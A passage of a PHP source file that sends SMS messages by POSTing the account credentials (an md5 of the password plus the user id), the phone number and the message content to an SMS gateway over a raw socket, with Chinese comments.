    return send($http,$uid,$pwd,$mobile,$content,$mobileids);

}

function send($http,$uid,$pwd,$mobile,$content,$mobileids,$time='',$mid='')
{

    $data = array(
        'uid'=> $uid,                   //用户账号
        'pwd'=>md5($pwd.$uid),          //MD5位32密码,密码和用户名拼接字符
        'mobile'=>$mobile,              //号码
        'content'=>$content,            //内容
        'mobileids'=>$mobileids,
        'time'=>$time,                  //定时发送
        );
    $re= postSMS($http,$data);          //POST方式提交
    return $re;
}

function postSMS($url,$data='')
{
    $port="";
    $post="";
    $row = parse_url($url);
    $host = $row['host'];
    $port = $row['port'] ? $row['port']:80;
    $file = $row['path'];
    while (list($k,$v) = each($data))
    {
        $post .= rawurlencode($k)."=".rawurlencode($v)."&"; //转URL标准码
    }
    $post = substr( $post , 0 , -1 );
    $len = strlen($post);
    $fp = @fsockopen( $host ,$port, $errno, $errstr, 10);
    if (!$fp) {
        return "$errstr ($errno)\n";
    } else {
        $receive = '';
        $out = "POST $file HTTP/1.1\r\n";
        $out .= "Host: $host\r\n";
        $out .= "Content-type: application/x-www-form-urlencoded\r\n";
        $out .= "Connection: Close\r\n";
        $out .= "Content-Length: $len\r\n\r\n";
        $out .= $post;
        fwrite($fp, $out);
        while (!feof($fp)) {
            $receive .= fgets($fp, 128);
        }
        fclose($fp);
        $receive = explode("\r\n\r\n",$receive);
        unset($receive[0]);
        return implode("",$receive);
    }
}

?>